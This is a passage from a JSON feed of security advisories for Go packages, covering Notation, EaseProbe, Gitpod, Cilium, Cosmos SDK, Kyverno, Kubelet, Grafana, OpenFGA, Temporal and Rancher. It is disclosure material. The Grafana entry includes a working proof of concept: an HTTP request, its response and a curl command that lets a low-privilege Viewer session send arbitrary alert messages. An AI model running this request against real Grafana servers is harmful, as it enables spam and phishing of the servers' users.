Pritesh Bandi (@priteshbandi)  for root cause analysis.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/notaryproject/notation-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/notaryproject/notation-go/security/advisories/GHSA-xhg5-42rf-296r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33959"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation-go/commit/39c8ed050a65cca3f3f308534acb612096735a64"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation-go/commit/eba60f5aed9c9e05dee55324423c95fe34700b4c"}, {"type": "PACKAGE", "url": "https://github.com/notaryproject/notation-go"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.6"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-06T16:45:29Z", "nvd_published_at": "2023-06-06T19:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4c32-w6c7-77x4", "modified": "2023-06-06T01:38:49Z", "published": "2023-06-06T01:38:49Z", "aliases": ["CVE-2023-33967"], "summary": "SQL injection when using MySQL/PostgreSQL data checking", "details": "An SQL injection issue was discovered in EaseProbe before 2.1.0 when using MySQL/PostgreSQL data checking. This problem has been fixed in v2.1.0; users should upgrade to this version.\n\nThe vulnerability was discovered by the [Oxeye research](https://www.oxeye.io/) team.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/megaease/easeprobe"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/megaease/easeprobe/security/advisories/GHSA-4c32-w6c7-77x4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33967"}, {"type": "WEB", "url": "https://github.com/megaease/easeprobe/pull/330"}, {"type": "WEB", "url": "https://github.com/megaease/easeprobe/commit/caaf5860df2aaa76acd29bc40ec9a578d0b1d6e1"}, {"type": "PACKAGE", "url": "https://github.com/megaease/easeprobe"}, {"type": "WEB", "url": "https://github.com/megaease/easeprobe/releases/tag/v2.1.0"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:38:49Z", "nvd_published_at": "2023-05-31T18:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gqx9-h3w2-fprg", "modified": "2023-06-12T16:44:45Z", "published": "2023-06-05T15:33:28Z", "aliases": ["CVE-2023-32766"], "summary": "Gitpod vulnerable to Cross-site Scripting", "details": "Gitpod before 2022.11.3 allows XSS because redirection can occur for some protocols outside of the trusted set of three (vscode: vscode-insiders: jetbrains-gateway:).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gitpod-io/gitpod"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2022.11.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32766"}, {"type": "WEB", "url": "https://github.com/gitpod-io/gitpod/pull/17559"}, {"type": "WEB", "url": "https://github.com/gitpod-io/gitpod/commit/6771283c3406586e352337675b79ff2ca50f191b"}, {"type": "WEB", "url": "https://app.safebase.io/portal/71ccd717-aa2d-4a1e-942e-c768d37e9e0c/preview?product=default&tcuUid=1d505bda-9a38-4ca5-8724-052e6337f34d"}, {"type": "PACKAGE", "url": "https://github.com/gitpod-io/gitpod"}, {"type": "WEB", "url": "https://github.com/gitpod-io/gitpod/compare/release-2022.11.2...2022.11.3"}, {"type": "WEB", "url": "https://github.com/gitpod-io/gitpod/releases/tag/2022.11.3"}, {"type": "WEB", "url": "https://www.gitpod.io"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T02:07:25Z", "nvd_published_at": "2023-06-05T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r7wr-4w5q-55m6", "modified": "2023-06-16T17:47:56Z", "published": "2023-06-16T17:47:56Z", "aliases": ["CVE-2023-34242"], "summary": "Cilium vulnerable to information leakage via incorrect ReferenceGrant handling", "details": "### Impact\n\nWhen the [Gateway API](https://docs.cilium.io/en/v1.13/network/servicemesh/gateway-api/gateway-api/) is enabled in Cilium, the absence of a check on the namespace in which a [ReferenceGrant](https://gateway-api.sigs.k8s.io/api-types/referencegrant/) is created could result in Cilium gaining visibility of secrets (including certificates) and services across namespaces.\n\nAn attacker on an affected cluster can configure Cilium to use cluster secrets or communicate with services that it should not have access to.\n\nGateway API functionality is disabled by default.\n\n### Patches\n\nThis vulnerability is fixed in Cilium release 1.13.4.\n\nCilium versions <1.13 are not affected.\n\n### Workarounds\n\nThere is no workaround to this issue.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @meyskens for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-r7wr-4w5q-55m6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34242"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.13.4"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-16T17:47:56Z", "nvd_published_at": "2023-06-15T20:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qfc5-6r3j-jj22", "modified": "2023-07-05T19:52:13Z", "published": "2023-06-02T17:11:58Z", "aliases": [], "summary": "Go package github.com/cosmos/cosmos-sdk module x/crisis does NOT cause chain halt", "details": "# x/crisis does NOT cause chain halt\n\n### Impact\nIf an invariant check fails on a Cosmos SDK network and a transaction is sent to the `x/crisis` module to halt the chain, the chain does not halt. All versions of the `x/crisis` module is affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message is supposed to cause the nodes to panic. However, because the panic is within a transaction, it is caught by the SDK\u2019s built-in panic-recovery machinery and just treated as a normal \u201cinvalid\u201d transaction (ie. it returns a non-zero abci Code). Thus the `x/crisis` transactions don\u2019t actually cause chains to halt. If there is an invariant violation, it can be confirmed with an `x/crisis` transaction, but it won\u2019t cause any nodes to halt, they will just continue processing blocks.\n\nThat said, any node running with `start --inv-check-period X` will actually panic when it runs the periodic check (though it will still not panic just by processing an `x/crisis` transaction). Since this panic is located in EndBlock, it is not caught by the panic-recovery machinery and does actually crash the node. Presumably few if any nodes actually run with this in production because of how long the invariant checks take, and this runs all of them every `X` blocks.\n\n### Patches\nNo patches will be released.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behaviour in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks, but may not be worth halting for.\n\nIn some cases, chains have already broken the invariant calculations but have dealt with the consequences off-chain or during development. Halting these chains would be counter-productive.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will not be patched for chain halts. The module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nIn case of a valid invariant check failure that requires a chain halt, the network validators are encouraged to coordinate off-chain for network halts. This has been an already established process for security patches.\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\nPublic report: https://github.com/cosmos/cosmos-sdk/issues/15325", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.47.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-qfc5-6r3j-jj22"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/issues/15325"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/issues/15706"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-02T17:11:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hq4m-4948-64cc", "modified": "2023-06-05T17:10:13Z", "published": "2023-06-05T17:10:13Z", "aliases": ["CVE-2023-34091"], "summary": "Kyverno resource with a deletionTimestamp may allow policy circumvention", "details": "### Impact\n\nIn versions of Kyverno prior to 1.10.0, resources which have the `deletionTimestamp` field defined can bypass validate, generate, or mutate-existing policies, even in cases where the `validationFailureAction` field is set to `Enforce`. \n\nThis situation occurs as resources pending deletion were being consciously exempted by Kyverno, as a way to reduce processing load as policies are typically not applied to objects which are being deleted. \n\nHowever, this could potentially result in allowing a malicious user to leverage the [Kubernetes finalizers feature](https://kubernetes.io/docs/concepts/overview/working-with-objects/finalizers/) by setting a finalizer which causes the Kubernetes API server to set the `deletionTimestamp` and then not completing the delete operation as a way to explicitly to bypass a Kyverno policy. \n\nNote that this is not applicable to Kubernetes Pods but, as an example, a Kubernetes Service resource can be manipulated using an indefinite finalizer to bypass policies.\n\n\n### Patches\nThis is resolved in Kyverno 1.10.0.\n\n### Workarounds\nThere is no known workaround.\n\n### References\n_Are there any links users can visit to find out more?_\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kyverno/kyverno"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-hq4m-4948-64cc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34091"}, {"type": "PACKAGE", "url": "https://github.com/kyverno/kyverno"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/releases/tag/v1.10.0"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-05T17:10:13Z", "nvd_published_at": "2023-06-01T17:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xc8m-28vv-4pjc", "modified": "2023-06-30T20:33:26Z", "published": "2023-06-16T09:30:24Z", "aliases": ["CVE-2023-2431"], "summary": "Kubelet vulnerable to bypass of seccomp profile enforcement", "details": "A security issue was discovered in Kubelet that allows pods to bypass the seccomp profile enforcement. Pods that use localhost type for seccomp profile but specify an empty profile field, are affected by this issue. In this scenario, this vulnerability allows the pod to run in unconfined (seccomp disabled) mode. This bug affects Kubelet.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.14"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.10"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2431"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/118690"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/117020"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/117116"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/117117"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/117118"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/117147"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/QHmx0HOQa10"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/43HDSKBKPSW53OW647B5ETHRWFFNHSRQ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XBX4RL4UOC7JHWWYB2AJCKSUM7EG5Y5G/"}], "database_specific": {"cwe_ids": ["CWE-1287"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-16T19:42:18Z", "nvd_published_at": "2023-06-16T08:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cvm3-pp2j-chr3", "modified": "2023-06-12T20:09:27Z", "published": "2023-06-12T20:09:27Z", "aliases": ["CVE-2023-2183"], "summary": "Grafana has Broken Access Control in Alert manager: Viewer can send test alerts", "details": "### Summary\nGrafana allows an attacker in the Viewer role, send alerts by API Alert - Test. The option is not available from the user panel UI for in the Viewer role. \n\n**Reason for the error**: The API does not check access to this function and allows it by users with the least rights, for example, the Viewer that does not see this option in the user panel. \n\nThis enables malicious users to abuse the functionality by sending multiple alert messages (e-mail, slack, etc\u2026), spamming users, prepare Phishing attack or blocked SMTP server / IP and automatically moved all message to spam folder, add to black list IP.\n\n\n### Details\nThe logged-in user, in the Viewer role, in the user panel, does not have access to the test option of sending an e-mail alert. \n\nView of the panel for the user in the Viewer role:\n![image](https://user-images.githubusercontent.com/1643385/232904030-e8a8338d-f5e3-4b04-80c3-32f2164a190e.png)\n\nAdmin role - View panel for admin role:\n![image](https://user-images.githubusercontent.com/1643385/232904264-c7aba0a5-0642-496b-998d-d500eb5ead7f.png)\n\nAdmin role - Next step \u2013 editing:\n![image](https://user-images.githubusercontent.com/1643385/232904388-ef2ee69e-3ee3-41a9-8687-305886c5c0b9.png)\n\nAdmin role - Additional options:\n![image](https://user-images.githubusercontent.com/1643385/232904480-dd493d34-d66d-47af-ab4f-3273ae8976bc.png)\n\n\n\n### PoC\n\n**HTTP Request by user in role Viewer**\n```\nPOST /api/alertmanager/grafana/config/api/v1/receivers/test HTTP/1.1\nHost: xxx\nCookie: grafana_session=xxx\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://xxx/alerting/notifications/receivers/grafana-default-email/edit?alertmanager=grafana\naccept: application/json, text/plain, */*\ncontent-type: application/json\n\u2026\n\n{\"receivers\":[{\"name\":\"test\",\"grafana_managed_receiver_configs\":[{\"settings\":{\"addresses\":\"<test@example.com>\",\n\"singleEmail\":true},\"secureSettings\":{},\"type\":\"email\",\"name\":\"test\",\"disableResolveMessage\":false}]}],\n\"alert\":{\"annotations\":{\"runbook_url\":\"http://example.com \",\"description\":\"tekst\",\"testowy\":\"test http://example.com\",\n\"more\":\"http://example.com \"},\"labels\":{}}}\n\n```\n\n**HTTP Response:**\n```\nHTTP/1.1 200 OK\nCache-Control: no-cache\nContent-Type: application/json\nExpires: -1\nPragma: no-cache\nX-Content-Type-Options: nosniff\nX-Frame-Options: deny\nX-Xss-Protection: 1; mode=block\nDate: Wed, 05 Apr 2023 10:43:00 GMT\nContent-Length: 471\n\n{\"alert\":{\"annotations\":{\"__value_string__\":\"[ metric='foo' labels={instance=bar} value=10 ]\",\"description\":\"tekst\",\n\"more\":\"http://example.com\",\"runbook_url\":\"http://example.com\",\"summary\":\"Notification test\",\n\"testowy\":\"testowy http://example.com\"},\"labels\":{\"alertname\":\"TestAlert\",\"instance\":\"Grafana\"}},\n\"receivers\":[{\"name\":\"test\",\"grafana_managed_receiver_configs\":[{\"name\":\"test\",\"uid\":\"ojUhNFL4k\",\"status\":\"ok\"}]}],\n\"notified_at\":\"2023-04-05T12:43:00.1430203+02:00\"}\n\n```\n\n## Result:\nThe attacker can send as a template alert or plain/text.\n\n![image](https://user-images.githubusercontent.com/1643385/232917993-1294cfe0-3040-4d04-a533-a72ecbc666c0.png)\n\n\n### Impact\nAs I showed above, an enabled user in the lowest role can execute an endpoint API that allows him to send an e-mail as an alert and impersonate its content. If modified accordingly, the recipient may fall victim to a Phishing attack or a targeted attack to block the SMTP server. \n\nFrom a practical point of view, this means that for each \"GrafanaReceiver\" e.g.: Slack, E-mail, etc.. You can send any alert message from user with the least privileged. \n\nCURL example \u2013 using a user session in the Viewer role:\n\n```\ncurl -i -s -k -X $'POST' \\\n    -H $'Host: localhost:3002' -H $'Content-Length: 386' -H $'sec-ch-ua: \\\"Not:A-Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"112\\\"' -H $'accept: application/json, text/plain, */*' -H $'content-type: application/json' -H $'x-grafana-org-id: 1' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/527.36 (KHTML, like Gecko) Chrome/112.0.2615.50 Safari/11.36' -H $'sec-ch-ua-platform: \\\"macOS\\\"' -H $'Origin: http://localhost:3002' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://localhost:3002/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Connection: close' \\\n    -b $'grafana_session=xxx' \\\n    --data-binary $'{\\\"receivers\\\":[{\\\"name\\\":\\\"test\\\",\\\"grafana_managed_receiver_configs\\\":[{\\\"settings\\\":{\\\"addresses\\\":\\\"<test@example.com>\\\",\\\"singleEmail\\\":true\\x0d\\x0a},\\\"secureSettings\\\":{},\\\"type\\\":\\\"email\\\",\\\"name\\\":\\\"test\\\",\\\"disableResolveMessage\\\":false}]}],\\\"alert\\\":{\\\"annotations\\\":{\\\"runbook_url\\\":\\\"http://example.com\\\",\\\"description\\\":\\\"tekst\\\",\\\"testowy\\\":\\\"testowy http://example.com\\\",\\x0d\\x0a\\\"more\\\":\\\"http://example.com\\\"\\x0d\\x0a},\\\"labels\\\":{}}}\\x0d\\x0a' \\\n    $'http://localhost:3002/api/alertmanager/grafana/config/api/v1/receivers/test'\n```\n\n### Mitigation\n\n1. In the SMTP server configuration settings, limit the ability to send multiple e-mails to the same e-mail address per unit of time / threshold. \n2. Check the API for the possibility of accessing this endpoint for other roles than admin\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.5.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.19"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.4.0"}, {"fixed": "9.4.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.5.0"}, {"fixed": "9.5.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/bugbounty/security/advisories/GHSA-cvm3-pp2j-chr3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2183"}, {"type": "PACKAGE", "url": "https://github.com/grafana/bugbounty"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-2183/"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-12T20:09:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rvrx-rrwh-r9p6", "modified": "2023-06-16T17:53:52Z", "published": "2023-06-06T16:44:58Z", "aliases": ["CVE-2023-33958"], "summary": "Notation's default `maxSignatureAttempts` in `notation verify` enables an endless data attack", "details": "### Impact\nAn attacker who controls or compromises a registry can make the registry serve an infinite number of signatures for the artifact, causing a denial of service to the host machine running `notation verify`.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6). Users should upgrade their notation packages to [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT) for root cause analysis.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/notaryproject/notation"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/notaryproject/notation/security/advisories/GHSA-rvrx-rrwh-r9p6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33958"}, {"type": "PACKAGE", "url": "https://github.com/notaryproject/notation"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T16:44:58Z", "nvd_published_at": "2023-06-06T19:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hr9r-8phq-5x8j", "modified": "2023-07-03T18:39:26Z", "published": "2023-06-28T22:49:49Z", "aliases": ["CVE-2023-35933"], "summary": "OpenFGA vulnerable to denial of service due to circular relationship", "details": "### Overview\n\nOpenFGA versions v1.1.0 and prior are vulnerable to a DoS attack when certain Check and ListObjects calls are executed against authorization models that contain circular relationship definitions.\n\n### Am I Affected?\n\nYou are affected by this vulnerability if you are using OpenFGA v1.1.0 or earlier, and if you are executing certain [Check](https://openfga.dev/api/service#/Relationship%20Queries/Check) or [ListObjects](https://openfga.dev/api/service#/Relationship%20Queries/ListObjects) calls against a vulnerable authorization model. To see which of your models could be vulnerable to this attack, download OpenFGA v1.2.0 and run the following command: \n\n```\n./openfga validate-models --datastore-engine <ENGINE> --datastore-uri <URI> | jq .[] | select(.Error | contains(\"loop\"))\n```\n\nreplacing the variables `<ENGINE>` and `<URI>` as needed.\n\n### Fix\n\nUpgrade to v1.1.1.\n\n### Backward Compatibility\n\nIf you are not passing an invalid authorization model (as identified by running `./openfga validate-models`) as a parameter of your Check and ListObjects calls, this upgrade is backwards compatible. \n\nOtherwise, OpenFGA v1.1.1 will start returning HTTP 400 status codes on those calls.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-hr9r-8phq-5x8j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35933"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/087ce392595f3c319ab3028b5089118ea4063452"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://openfga.dev/api/service#/Relationship%20Queries/Check"}, {"type": "WEB", "url": "https://openfga.dev/api/service#/Relationship%20Queries/ListObjects"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-28T22:49:49Z", "nvd_published_at": "2023-06-26T20:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gm2g-2xr9-pxxj", "modified": "2023-07-10T10:36:45Z", "published": "2023-06-30T18:31:02Z", "aliases": ["CVE-2023-3485"], "summary": "Temporal Server vulnerable to Incorrect Authorization and Insecure Default Initialization of Resource", "details": "Insecure defaults in open-source Temporal Server before version 1.20 on all platforms allows an attacker to craft a task token with access to a namespace other than the one specified in the request. Creation of this task token must be done outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task failed or completed.\nIf a task is targeted for completion by the attacker, the targeted namespace must also be using the same data converter configuration as the initial, valid, namespace for the task completion payload to be decoded by workers in the target namespace.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.temporal.io/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.20.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3485"}, {"type": "PACKAGE", "url": "https://github.com/temporalio/temporal"}, {"type": "WEB", "url": "https://github.com/temporalio/temporal/releases/tag/v1.20.0"}], "database_specific": {"cwe_ids": ["CWE-1188", "CWE-863"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-30T20:25:35Z", "nvd_published_at": "2023-06-30T18:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-46v3-ggjg-qq3x", "modified": "2023-06-06T01:59:54Z", "published": "2023-06-06T01:59:54Z", "aliases": ["CVE-2022-43760"], "summary": "Rancher UI has multiple Cross-Site Scripting (XSS) issues", "details": "### Impact\nMultiple Cross-Site Scripting (XSS) vulnerabilities have been identified in the Rancher UI. \nCross-Site scripting allows a malicious user to inject code that is executed within another user's browser, allowing the attacker to steal sensitive information, manipulate web content, or perform other malicious activities on behalf of the victims. This could result in a user with write access to the affected areas being able to act on behalf of an administrator, once an administrator opens the affected web page.\n\nThe affected areas include the Projects/Namespaces and Auth Provider sections. The attacker needs to be authenticated and have write access to those features in order to exploit the vulnerabilities. Some of the permissions (roles) required are:\n\n- Project Owner.\n- Restricted Admin.\n- Configure Authentication.\n- Administrator.\n- Custom RBAC Role that provides write access on Projects or External Authentication Providers.\n\nFor users that suspect this vulnerability may have targeted their Rancher instance, we recommend rotating all API Keys and Kubeconfig tokens.\n\nIt's also advised to review logs and possibly rotate credentials stored as secrets in Rancher and downstream cluster, if you believe that users' credentials to access Rancher and its clusters might have been compromised.\n\n### Patches\nPatched versions include releases `2.6.13`, `2.7.4` and later versions.\n\n### Workarounds\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### Credits\nWe would like to recognize and thank @bybit-sec for the responsible disclosure of this security issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.13"}]}]}, {"package": {"ecosystem": "Go", "name": "rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-46v3-ggjg-qq3x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43760"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2022-43760"}, 